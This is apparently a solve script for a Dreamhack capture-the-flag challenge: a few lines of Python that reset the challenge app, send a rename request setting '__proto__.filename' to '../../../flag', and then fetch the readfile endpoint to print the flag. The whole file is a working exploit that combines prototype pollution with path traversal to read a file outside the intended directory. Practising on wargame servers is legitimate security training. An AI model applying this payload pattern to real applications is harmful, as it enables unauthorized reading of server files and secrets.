import requests

port = 19640
url_index = f"http://host3.dreamhack.games:{port}/"
url_test = url_index + "test"
url_read = url_index + "readfile"


r = requests.get(url_test + "?func=reset")
r = requests.get(
    url_test + "?func=rename&filename=__proto__.filename&rename=../../../flag"
)
r = requests.get(url_read)
print(r.text)
